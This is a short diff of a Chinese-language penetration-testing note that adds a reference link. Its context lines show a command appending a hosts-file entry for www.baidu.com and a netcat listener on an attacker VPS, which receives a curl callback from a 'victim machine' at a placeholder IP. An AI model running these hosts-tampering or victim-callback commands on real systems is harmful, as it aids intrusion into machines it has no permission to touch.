@@ -41,3 +41,6 @@ echo "127.0.0.2 www.baidu.com" >> /etc/hosts
 VPS上执行：nc -n -v -lp 3636
 受害机上执行：curl http://xx.xx.xx.xx:3636
 ```
+
+### 参考链接
+https://www.freebuf.com/vuls/211847.html  
